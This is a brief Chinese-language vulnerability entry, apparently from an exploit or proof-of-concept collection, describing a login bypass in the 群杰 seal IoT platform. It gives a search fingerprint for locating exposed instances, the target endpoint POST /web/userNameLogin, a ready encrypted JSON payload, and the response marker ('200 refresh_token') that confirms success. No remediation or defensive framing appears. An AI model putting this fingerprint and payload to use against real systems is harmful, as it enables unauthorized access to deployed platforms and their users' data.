# 群杰印章物联网平台userNameLogin存在登录绕过漏洞

群杰印章物联网平台 ｜ 其他 ｜ —
- **指纹**：`body="群杰印章物联网平台"`
- **请求**：`POST /web/userNameLogin HTTP/1.1`

**Payload**
```
{"data":"Kuc6J023uv6f02wtN5QxbmFQd4W1kl6EWndTUrJae4/UAD8yAf6Vy/j6X9c1ccQSczndbdd+pI6DR1UKVAsf7FgOwFoNu/blmhzdH2LIArOqj/Wor0Tk90gvrUARcEsPoqfCvrHEnLov4AokD80EdJ0vZT3zl6BbzSdAoYduNxQ="}
```
- **响应特征**：200 refresh_token